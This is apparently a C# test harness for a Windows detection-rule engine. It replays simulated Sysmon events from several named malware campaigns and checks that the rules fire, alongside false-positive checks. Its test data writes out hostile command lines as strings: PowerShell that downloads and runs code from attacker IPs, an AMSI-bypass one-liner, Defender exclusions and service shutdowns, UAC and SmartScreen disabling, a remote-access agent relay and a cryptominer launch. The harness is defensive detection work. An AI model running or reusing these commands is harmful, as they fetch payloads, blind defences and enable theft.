using Inquisitron.Services;

// Locate the live master rule set (publish\suspicion-rules.json) by walking up
// from the build output, then place it beside the test binary so SuspicionRules
// loads it exactly as the app does.
string? found = null;
for (var dir = new DirectoryInfo(AppContext.BaseDirectory); dir is not null; dir = dir.Parent)
{
    var candidate = Path.Combine(dir.FullName, "publish", "suspicion-rules.json");
    if (File.Exists(candidate)) { found = candidate; break; }
}
if (found is null) { Console.WriteLine("publish\\suspicion-rules.json not found"); Environment.Exit(1); }
var target = Path.Combine(AppContext.BaseDirectory, "suspicion-rules.json");
File.Copy(found, target, true);
Console.WriteLine($"Loaded: {found}");
SuspicionRules.Reload();
Console.WriteLine($"Rules: {SuspicionRules.Source}\n");
if (SuspicionRules.Source.Contains("invalid") || SuspicionRules.Source.Contains("NO RULES"))
{
    Console.WriteLine("RULE FILE FAILED TO PARSE — aborting.");
    Environment.Exit(1);
}

var pass = 0; var fail = 0;
List<KeyValuePair<string, string>> D(params (string k, string v)[] kv) =>
    kv.Select(p => new KeyValuePair<string, string>(p.k, p.v)).ToList();

// expectedRule may list alternatives separated by '|' — used where several
// campaign rules legitimately match the same event and any of them is a
// correct verdict. Every rule still gets an exact probe in the isolation
// section below, so alternatives here never hide a dead rule.
void Expect(string scenario, string expectedRule, int eid, string image, string parent,
            List<KeyValuePair<string, string>> data)
{
    var hit = SuspicionRules.Evaluate(eid, image, parent, data);
    if (hit is not null && expectedRule.Split('|')
            .Any(alt => hit.Name.Contains(alt.Trim(), StringComparison.OrdinalIgnoreCase)))
    {
        pass++;
        Console.WriteLine($"  ok   {scenario}");
        Console.WriteLine($"         -> [{hit.Severity}] {hit.Name}");
    }
    else
    {
        fail++;
        Console.WriteLine($"  FAIL {scenario}");
        Console.WriteLine($"         expected a rule matching \"{expectedRule}\", got: {(hit is null ? "(no match)" : hit.Name)}");
    }
}

void ExpectClean(string scenario, int eid, string image, string parent, List<KeyValuePair<string, string>> data)
{
    var hit = SuspicionRules.Evaluate(eid, image, parent, data);
    if (hit is null) { pass++; Console.WriteLine($"  ok   {scenario} (correctly not flagged)"); }
    else { fail++; Console.WriteLine($"  FAIL {scenario} — false positive: {hit.Name}"); }
}

const string PS = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
const string WSCRIPT = @"C:\Windows\System32\wscript.exe";
const string CMD = @"C:\Windows\System32\cmd.exe";
const string MSIEXEC = @"C:\Windows\System32\msiexec.exe";
const string EXPLORER = @"C:\Windows\explorer.exe";

Console.WriteLine("=== SMOKE#SCREEN Sample 1: zoom-update.vbs kill chain ===");

Expect("1. User runs zoom-update.vbs from Downloads", "VBScript launched",
    1, WSCRIPT, EXPLORER,
    D(("Image", WSCRIPT), ("CommandLine", @"""C:\Windows\System32\WScript.exe"" ""C:\Users\demo\Downloads\zoom-update.vbs""")));

Expect("2. VBScript spawns hidden PowerShell (objShell.Run payload,0,False)", "VBScript dropper spawned PowerShell",
    1, PS, WSCRIPT,
    D(("Image", PS), ("ParentImage", WSCRIPT),
      ("CommandLine", @"powershell.exe -w hidden -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://207.189.11.170/Bin/working_payload.cs')"""),
      ("ParentCommandLine", @"wscript.exe zoom-update.vbs")));

Expect("3. In-memory C# compile via Add-Type -Language CSharp", "in-memory C# compile|VBScript dropper spawned PowerShell",
    1, PS, WSCRIPT,
    D(("Image", PS),
      ("CommandLine", @"powershell -c ""$s=(New-Object Net.WebClient).DownloadString('http://207.189.11.170/Bin/working_payload.cs'); Add-Type -Language CSharp -TypeDefinition $s; [HelloWorld.Program]::SayHello()""")));

Expect("4. Network connection to former C# host 207.189.11.170", "C2 network connection",
    3, PS, "",
    D(("Image", PS), ("DestinationIp", "207.189.11.170"), ("DestinationPort", "80")));

Expect("5. Silent MSI install of ScreenConnect from TEMP", "silent MSI install",
    1, MSIEXEC, PS,
    D(("Image", MSIEXEC), ("ParentImage", PS),
      ("CommandLine", @"msiexec /i ""C:\Users\demo\AppData\Local\Temp\Zoomupdateinstaller.msi"" /qn")));

Expect("6. ScreenConnect agent beacons to primary relay 207.174.0.143:8041", "C2 network connection",
    3, @"C:\Program Files (x86)\ScreenConnect Client\ScreenConnect.ClientService.exe", "",
    D(("Image", @"C:\Program Files (x86)\ScreenConnect Client\ScreenConnect.ClientService.exe"),
      ("DestinationIp", "207.174.0.143"), ("DestinationPort", "8041")));

Expect("7. ScreenConnect guest-access parameters", "guest-access|C2 host in command line",
    1, @"C:\Windows\Temp\ScreenConnect.WindowsClient.exe", MSIEXEC,
    D(("Image", @"C:\Windows\Temp\ScreenConnect.WindowsClient.exe"),
      ("CommandLine", @"ScreenConnect.WindowsClient.exe ""?e=Access&y=Guest&h=207.174.0.143&p=8041""")));

Console.WriteLine("\n=== SMOKE#SCREEN Sample 3: SystemCheck kill chain ===");

Expect("1. SystemCheck.gzip extracted to disk", "masquerade filename",
    11, @"C:\Windows\System32\cmd.exe", "",
    D(("TargetFilename", @"C:\Users\demo\Downloads\SystemCheck.gzip")));

Expect("2. Stage 1 — AMSI bypass via amsiInitFailed reflection", "AMSI bypass",
    1, PS, CMD,
    D(("Image", PS), ("ParentImage", CMD),
      ("CommandLine", @"powershell -nop -w hidden -c ""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)""")));

Expect("3. Stage 2 — UAC self-elevation", "UAC self-elevation",
    1, PS, CMD,
    D(("Image", PS), ("ParentImage", CMD),
      ("CommandLine", @"powershell -c ""Start-Process -FilePath 'SystemCheck.bat' -Verb RunAs""")));

Expect("4. Stage 3 — SmartScreen registry teardown", "SmartScreen disabled",
    13, EXPLORER, "",
    D(("TargetObject", @"HKLM\SOFTWARE\Policies\Microsoft\Windows\System\EnableSmartScreen"), ("Details", "DWORD (0x00000000)")));

Expect("5. Stage 3 — Explorer killed to apply policy", "Explorer restarted",
    1, @"C:\Windows\System32\taskkill.exe", CMD,
    D(("Image", @"C:\Windows\System32\taskkill.exe"), ("CommandLine", @"taskkill /f /im explorer.exe")));

Expect("6. Stage 4 — Defender exclusion for TEMP directory", "Defender exclusion added",
    1, PS, CMD,
    D(("Image", PS), ("CommandLine", @"powershell -c ""Add-MpPreference -ExclusionPath 'C:\Users\demo\AppData\Local\Temp'""")));

Expect("7. MemoryLoader — Defender exclusion for entire C:\\ drive", "entire drive",
    1, PS, @"C:\Users\demo\Downloads\AdobeReader_Update.exe",
    D(("Image", PS), ("CommandLine", @"powershell -w hidden -c ""Add-MpPreference -ExclusionPath 'C:\'""")));

Expect("8. MemoryLoader — WinDefend service stopped", "Defender service killed",
    1, PS, @"C:\Users\demo\Downloads\lirMkvpf.exe",
    D(("Image", PS), ("CommandLine", @"powershell -w hidden -c ""Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled""")));

Expect("9. Stage 4 — MSI written to TEMP under masquerade name", "masquerade filename",
    11, PS, "",
    D(("Image", PS), ("TargetFilename", @"C:\Users\demo\AppData\Local\Temp\WindowsExplorerSupport.msi")));

Expect("10. Stage 5 — Mark-of-the-Web stripped with Unlock-File", "Mark-of-the-Web",
    1, PS, CMD,
    D(("Image", PS), ("CommandLine", @"powershell -c ""Unlock-File -Path 'C:\Users\demo\AppData\Local\Temp\WindowsExplorerSupport.msi'""")));

Expect("11. Stage 5 — silent install", "silent MSI install",
    1, MSIEXEC, CMD,
    D(("Image", MSIEXEC), ("ParentImage", CMD),
      ("CommandLine", @"msiexec /i ""C:\Users\demo\AppData\Local\Temp\WindowsExplorerSupport.msi"" /qn")));

Expect("12. Stage 5 — installer self-deleted", "self-delete|masquerade filename",
    23, MSIEXEC, "",
    D(("Image", MSIEXEC), ("TargetFilename", @"C:\Users\demo\AppData\Local\Temp\WindowsExplorerSupport.msi")));

Console.WriteLine("\n=== Shared infrastructure ===");

Expect("Cloudflare Quick Tunnel DNS lookup", "C2 DNS lookup|Cloudflare Quick Tunnel",
    22, @"C:\Users\demo\Downloads\lirMkvpf.exe", "",
    D(("QueryName", "subscription-magnetic-recommended-meat.trycloudflare.com"), ("QueryResults", "104.16.231.132")));

Expect("Tertiary relay DNS lookup (fake admin portal)", "C2 DNS lookup",
    22, @"C:\Users\demo\Document-Viewer.exe", "",
    D(("QueryName", "blog.derrspecial-onlinedmin.live")));

Expect("Dropbox-hosted MSI download from phishing page", "Dropbox",
    22, @"C:\Program Files\Google\Chrome\chrome.exe", "",
    D(("QueryName", "dl.dropboxusercontent.com")));

Expect("/Bin/ staging path convention", "/Bin/ staging path|VBScript dropper spawned PowerShell",
    1, PS, WSCRIPT,
    D(("Image", PS), ("CommandLine", @"powershell -c ""iwr http://crestmarkhq.com/Bin/DocumentReview.msi -OutFile $env:TEMP\d.msi""")));

Console.WriteLine("\n=== DEAD#VAX: IPFS VHD -> WSF -> batch -> renamed PowerShell ===");

const string MBS = @"C:\Users\demo\AppData\Local\Temp\temp\mbs.exe";

Expect("1. VHD downloaded from IPFS gateway", "IPFS gateway",
    22, @"C:\Program Files\Google\Chrome\chrome.exe", "",
    D(("QueryName", "bafybeihdwdcefgh4dqkjv67uzcmw7ojee6xedzdetojuzjevtenxquvyku.ipfs.w3s.link")));

Expect("2. PurchaseOrder VHD written to Downloads", "Container image written|Installer dropped",
    11, @"C:\Program Files\Google\Chrome\chrome.exe", "",
    D(("TargetFilename", @"C:\Users\demo\Downloads\PurchaseOrder_9917_Docx.vhd")));

Expect("3. Double-extension .pdf.wsf dropped", "double-extension masquerade",
    11, @"C:\Program Files\Google\Chrome\chrome.exe", "",
    D(("TargetFilename", @"C:\Users\demo\Downloads\purchaseorder_reference_9917.pdf.wsf")));

Expect("4. WSF executed from the mounted volume", "WSF script execution|Script executed from mounted volume",
    1, WSCRIPT, EXPLORER,
    D(("Image", WSCRIPT), ("CommandLine", @"wscript.exe E:\order.wsf")));

Expect("5. Random-named batch dropped in nested %TEMP%\\temp", "nested temp staging|random-named script",
    11, WSCRIPT, "",
    D(("Image", WSCRIPT),
      ("TargetFilename", @"C:\Users\demo\AppData\Local\Temp\temp\MXVT60Xx6um7nRNl.bat")));

Expect("6. Anti-analysis — VMware check via WMI", "VM detection",
    1, PS, CMD,
    D(("Image", PS),
      ("CommandLine", @"powershell -c ""(Get-WmiObject Win32_ComputerSystem).Manufacturer -match 'VMware'""")));

Expect("7. Anti-analysis — sandbox RAM floor (3 GB)", "sandbox memory check",
    1, PS, CMD,
    D(("Image", PS),
      ("CommandLine", @"powershell -c ""if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 3221225472) { exit 123 }""")));

Expect("8. Anti-analysis — analyst artifact probe", "analyst-environment check",
    1, CMD, WSCRIPT,
    D(("Image", CMD), ("CommandLine", @"cmd /c net session >nul 2>&1")));

Expect("9. Batch self-copy to rEgX.cmd", "campaign artifact filename",
    11, CMD, "",
    D(("Image", CMD),
      ("TargetFilename", @"C:\Users\demo\AppData\Local\Temp\temp\rEgX.cmd")));

Expect("10. mbs.exe — powershell.exe renamed to dodge name-based rules", "renamed LOLBin",
    1, MBS, CMD,
    D(("Image", MBS), ("OriginalFileName", "powershell.exe"), ("ImageName", "mbs.exe"),
      ("CommandLine", @"mbs.exe -nop -w hidden -c ""Get-Content rEgX.cmd""")));

Expect("11. Self-read payload extraction via Get-Content", "self-read payload extraction|renamed LOLBin",
    1, PS, CMD,
    D(("Image", PS),
      ("CommandLine", @"powershell -c ""Get-Content 'rEgX.cmd' | Where-Object { $_ -match '^@ ' } | Set-Content windows.dll""")));

Expect("12. windows.dll written (base64 text, not a library)", "campaign artifact filename",
    11, MBS, "",
    D(("Image", MBS),
      ("TargetFilename", @"C:\Users\demo\AppData\Local\Temp\temp\windows.dll")));

Expect("13. MSXML used to base64-decode the payload", "MSXML base64",
    1, WSCRIPT, EXPLORER,
    D(("Image", WSCRIPT),
      ("CommandLine", @"wscript.exe //b decode.js Msxml2.DOMDocument.3.0 bin.base64")));

Console.WriteLine("\n=== FAUX#ELEVATE: French CV lure -> domain gate -> stealer + miner ===");

const string PUBLIC = @"C:\Users\Public\WindowsUpdate";

Expect("1. nouveau_curriculum_vitae.vbs opened from Downloads", "campaign artifact filename",
    1, WSCRIPT, EXPLORER,
    D(("Image", WSCRIPT),
      ("CommandLine", @"""C:\Windows\System32\WScript.exe"" ""C:\Users\demo\Downloads\nouveau_curriculum_vitae.vbs""")));

// The headline check: only domain-joined corporate hosts get the full chain.
Expect("2. Domain-join gate — WMI PartOfDomain (PowerShell form)", "domain-join enterprise gate",
    1, PS, EXPLORER,
    D(("Image", PS),
      ("CommandLine", @"powershell -c ""(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain""")));

Expect("3. Domain-join gate — WMI-Activity channel view of the VBS query", "domain-join enterprise gate",
    11, WSCRIPT, "",
    D(("Operation", @"Start IWbemServices::ExecQuery - root\cimv2 : Select * From Win32_ComputerSystem"),
      ("ClientProcessId", "4812"), ("User", "CORP\\user")));

Expect("4. Domain-join gate — wmic form", "domain-join enterprise gate",
    1, @"C:\Windows\System32\wbem\WMIC.exe", CMD,
    D(("Image", @"C:\Windows\System32\wbem\WMIC.exe"),
      ("CommandLine", @"wmic computersystem get domain")));

Expect("5. Domain-join gate — .NET GetCurrentDomain form", "domain-join enterprise gate",
    1, PS, CMD,
    D(("Image", PS),
      ("CommandLine", @"powershell -c ""[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()""")));

Expect("6. Persistent runas loop — wscript relaunching wscript", "runas elevation loop",
    1, WSCRIPT, WSCRIPT,
    D(("Image", WSCRIPT), ("ParentImage", WSCRIPT),
      ("CommandLine", @"wscript.exe C:\Users\demo\Documents\cv.vbs"),
      ("ParentCommandLine", @"wscript.exe C:\Users\demo\Documents\cv.vbs")));

Expect("7. Defender exclusions for drives C: through I:", "blinded to entire drive",
    1, PS, CMD,
    D(("Image", PS),
      ("CommandLine", @"cmd.exe /c powershell -C ""Add-MpPreference -ExclusionPath c:,d:,e:,f:,g:,h:,i:""")));

Expect("8. UAC switched off — EnableLUA registry write", "UAC disabled via EnableLUA",
    13, WSCRIPT, "",
    D(("TargetObject", @"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA"),
      ("Details", "DWORD (0x00000000)")));

Expect("9. Renamed 7-Zip unpacking the password-protected archive", "password-protected archive",
    1, @"C:\Users\Public\7g.exe", WSCRIPT,
    D(("Image", @"C:\Users\Public\7g.exe"),
      ("CommandLine", @"7g.exe e -p1625093 -y -o""C:\Users\Public\WindowsUpdate"" ""C:\Users\Public\gmail2.7z""")));

Expect("10. Chrome killed to unlock the credential database", "browser killed",
    1, @"C:\Windows\System32\taskkill.exe", WSCRIPT,
    D(("Image", @"C:\Windows\System32\taskkill.exe"), ("CommandLine", @"taskkill /f /im chrome.exe")));

Expect("11. Firefox credential store copied out", "browser credential store",
    11, WSCRIPT, "",
    D(("Image", WSCRIPT),
      ("TargetFilename", @"C:\Users\demo\AppData\Roaming\Mozilla\Firefox\Profiles\a1b2.default\key4.db")));

Expect("12. Staged exfil archive written", "campaign artifact filename",
    11, WSCRIPT, "",
    D(("Image", WSCRIPT), ("TargetFilename", $@"{PUBLIC}\profiles_TRINITY_4.zip")));

Expect("13. Victim geo-tagged before exfiltration", "geolocation lookup",
    22, WSCRIPT, "",
    D(("QueryName", "ipapi.co")));

Expect("14. SMTP exfiltration straight from wscript.exe", "SMTP exfiltration",
    3, WSCRIPT, "",
    D(("Image", WSCRIPT), ("ImageName", "wscript.exe"),
      ("DestinationIp", "94.100.180.160"), ("DestinationPort", "465")));

Expect("15. RuntimeHost.exe opens a firewall hole for its C2", "Firewall rule added",
    1, @"C:\Windows\System32\netsh.exe", $@"{PUBLIC}\RuntimeHost.exe",
    D(("Image", @"C:\Windows\System32\netsh.exe"),
      ("CommandLine", @"netsh advfirewall firewall add rule name=""Update"" dir=in action=allow")));

Expect("16. Injected explorer.exe beacons to the RAT channel", "injected explorer.exe beacon",
    3, EXPLORER, "",
    D(("Image", EXPLORER), ("ImageName", "explorer.exe"),
      ("DestinationIp", "217.64.148.121"), ("DestinationPort", "7077")));

Expect("17. Mining config pulled from a hacked WordPress site", "C2 and exfiltration infrastructure|fake image on compromised site",
    1, PS, $@"{PUBLIC}\mservice.vbs",
    D(("Image", PS),
      ("CommandLine", @"powershell -c ""iwr https://lmtop.ma/wp-content/uploads/2018/05/1300.png -OutFile $env:TEMP\c.txt""")));

Expect("18. XMRig launched with user-activity pause", "XMRig cryptominer",
    1, $@"{PUBLIC}\mservice.exe", WSCRIPT,
    D(("Image", $@"{PUBLIC}\mservice.exe"),
      ("CommandLine", @"mservice.exe --url=pool-fr.supportxmr.com:443 --tls --pause-on-active=10 --donate-level=0 --no-title")));

Expect("19. MSR kernel driver loaded for RandomX tuning", "MSR kernel driver",
    6, "", "",
    D(("ImageLoaded", $@"{PUBLIC}\WinRing0x64.sys"), ("Signed", "true")));

Expect("20. Stealer scripts self-deleted after exfiltration", "Script deleted itself|campaign artifact filename",
    23, WSCRIPT, "",
    D(("Image", WSCRIPT), ("TargetFilename", $@"{PUBLIC}\mozilla.vbs")));

// Rules that lose severity ties in the kill-chain replays above, each probed
// with an event only that rule matches — proving the rule itself is alive.
Console.WriteLine("\n=== Rule isolation probes ===");

Expect("in-memory C# compile fires on its own", "in-memory C# compile",
    1, PS, EXPLORER,
    D(("Image", PS), ("CommandLine", @"powershell -c ""Add-Type -Language CSharp -TypeDefinition $src; [HelloWorld.Program]::SayHello()""")));

Expect("/Bin/ staging path fires on its own", "/Bin/ staging path",
    1, PS, EXPLORER,
    D(("Image", PS), ("CommandLine", @"powershell -c ""iwr http://crestmarkhq.com/Bin/DocumentReview.msi -OutFile C:\out.msi""")));

Expect("Cloudflare Quick Tunnel fires on non-campaign tunnel", "Cloudflare Quick Tunnel",
    22, @"C:\Users\demo\Downloads\unknown-agent.exe", "",
    D(("QueryName", "odd-random-words.trycloudflare.com")));

Expect("installer self-delete fires on non-masquerade filename", "installer self-delete",
    23, @"C:\Windows\System32\cmd.exe", "",
    D(("TargetFilename", @"C:\Users\demo\AppData\Local\Temp\ordinary-tool.exe")));

Expect("guest-access install fires on non-campaign relay", "guest-access install",
    1, @"C:\Windows\Temp\ScreenConnect.WindowsClient.exe", MSIEXEC,
    D(("Image", @"C:\Windows\Temp\ScreenConnect.WindowsClient.exe"),
      ("CommandLine", @"ScreenConnect.WindowsClient.exe ""?e=Access&y=Guest&h=relay.example-rmm.net&p=8041""")));

Expect("masqueraded svchost still fires on a known bad parent", "Masqueraded svchost",
    1, @"C:\Users\demo\AppData\Local\Temp\svchost.exe", EXPLORER,
    D(("Image", @"C:\Users\demo\AppData\Local\Temp\svchost.exe"),
      ("CommandLine", @"svchost.exe -k netsvcs")));

Expect("fake-image config host fires on a non-IOC domain", "fake image on compromised site",
    1, PS, EXPLORER,
    D(("Image", PS),
      ("CommandLine", @"powershell -c ""iwr https://some-hacked-site.example/wp-content/uploads/2019/03/logo.png -OutFile c.txt""")));

Expect("script self-delete fires on a non-IOC script name", "Script deleted itself",
    23, CMD, "",
    D(("TargetFilename", @"C:\Users\demo\AppData\Local\Temp\stage2.vbs")));

Expect("double-extension masquerade fires on its own", "double-extension masquerade",
    11, @"C:\Program Files\7-Zip\7zFM.exe", "",
    D(("TargetFilename", @"C:\Users\demo\Documents\invoice.pdf.scr")));

Expect("WSF execution fires on its own", "WSF script execution",
    1, WSCRIPT, EXPLORER,
    D(("Image", WSCRIPT), ("CommandLine", @"wscript.exe C:\Users\demo\Documents\report.wsf")));

Console.WriteLine("\n=== False-positive checks (must stay clean) ===");

ExpectClean("Legit services.exe -> svchost.exe", 1, @"C:\Windows\System32\svchost.exe", @"C:\Windows\System32\services.exe",
    D(("Image", @"C:\Windows\System32\svchost.exe"), ("CommandLine", @"svchost.exe -k netsvcs -p")));

// Sysmon writes ParentImage "-" when it cannot resolve the parent (zeroed
// ParentProcessGuid) — seen in the wild for per-user services around logon.
ExpectClean("svchost with unresolvable parent \"-\"", 1, @"C:\Windows\System32\svchost.exe", "-",
    D(("Image", @"C:\Windows\System32\svchost.exe"),
      ("CommandLine", @"C:\WINDOWS\system32\svchost.exe -k LocalService -p -s CaptureService"),
      ("ParentImage", "-"), ("ParentCommandLine", "-")));

ExpectClean("Admin runs Get-MpComputerStatus", 1, PS, EXPLORER,
    D(("Image", PS), ("CommandLine", @"powershell -c ""Get-MpComputerStatus""")));

ExpectClean("Normal Chrome launch", 1, @"C:\Program Files\Google\Chrome\chrome.exe", EXPLORER,
    D(("Image", @"C:\Program Files\Google\Chrome\chrome.exe"), ("CommandLine", @"chrome.exe --type=renderer")));

ExpectClean("Windows Update MSI from system path", 1, MSIEXEC, @"C:\Windows\System32\services.exe",
    D(("Image", MSIEXEC), ("CommandLine", @"msiexec /i C:\Windows\Installer\update.msi")));

ExpectClean("Ordinary DNS lookup", 22, @"C:\Program Files\Google\Chrome\chrome.exe", "",
    D(("QueryName", "www.microsoft.com"), ("QueryResults", "23.53.12.1")));

ExpectClean("Document saved to Downloads", 11, @"C:\Program Files\Microsoft Office\WINWORD.EXE", "",
    D(("TargetFilename", @"C:\Users\demo\Downloads\quarterly-report.docx")));

// New-rule false positives (FAUX#ELEVATE / DEAD#VAX additions)
ExpectClean("7-Zip extracting an archive with no password", 1, @"C:\Program Files\7-Zip\7z.exe", EXPLORER,
    D(("Image", @"C:\Program Files\7-Zip\7z.exe"),
      ("CommandLine", @"7z.exe x ""C:\Users\demo\Downloads\photos.zip"" -oC:\Users\demo\Pictures")));

ExpectClean("Outlook talking to a mail server", 3, @"C:\Program Files\Microsoft Office\OUTLOOK.EXE", "",
    D(("Image", @"C:\Program Files\Microsoft Office\OUTLOOK.EXE"), ("ImageName", "OUTLOOK.EXE"),
      ("DestinationIp", "40.99.12.6"), ("DestinationPort", "587")));

ExpectClean("explorer.exe reaching a Microsoft host on 443", 3, EXPLORER, "",
    D(("Image", EXPLORER), ("ImageName", "explorer.exe"),
      ("DestinationIp", "23.53.12.1"), ("DestinationPort", "443")));

ExpectClean("Ordinary image download outside wp-content", 1, PS, EXPLORER,
    D(("Image", PS), ("CommandLine", @"powershell -c ""iwr https://cdn.example.com/assets/logo.png -OutFile logo.png""")));

ExpectClean("Admin queries computer model via WMI", 1, PS, EXPLORER,
    D(("Image", PS), ("CommandLine", @"powershell -c ""Get-CimInstance Win32_ComputerSystem | Select-Object Model""")));

ExpectClean("svchost.exe -p flag is not an archive password", 1, @"C:\Windows\System32\svchost.exe", @"C:\Windows\System32\services.exe",
    D(("Image", @"C:\Windows\System32\svchost.exe"),
      ("CommandLine", @"C:\WINDOWS\system32\svchost.exe -k LocalService -p -s CaptureService")));

Console.WriteLine($"\n{pass} passed, {fail} failed");
Environment.Exit(fail == 0 ? 0 : 1);
